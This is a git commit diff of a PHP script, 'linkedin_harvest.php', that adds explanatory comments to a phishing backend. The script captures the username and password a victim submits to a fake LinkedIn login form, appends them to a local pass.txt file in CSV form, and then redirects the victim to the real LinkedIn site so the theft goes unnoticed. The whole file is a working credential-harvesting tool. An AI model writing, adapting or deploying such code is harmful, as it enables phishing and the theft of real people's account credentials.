31a1c4108da186add6ea5d0142b8790de53baef0
Emin Yilmaz <124744654+eyilmaz1@users.noreply.github.com>
2023-04-01 23:33:03 -0400

    Update linkedin_harvest.php

--- linkedin_harvest.php
+++ linkedin_harvest.php
@@ -1,11 +1,16 @@
 <?php
+    //these are the names of the POST's of interest, that is the username and password
+    //there is no need to save anything else such as the cookies
     $username = $_POST["username"];
     $pass = $_POST["password"];
 
+    //create a file called pass.txt or write into it if created the results of what was
+    //in the POST value. It if formatted in csv format
     $handle = fopen("pass.txt", "a");
     fwrite($handle, $username . ", " . $pass . "\n");
     fclose($handle);
 
+    //After the user clicks on login, the window will be redirected to the actual Linkedin site
     header ("Location: https://www.linkedin.com");
 
     exit;
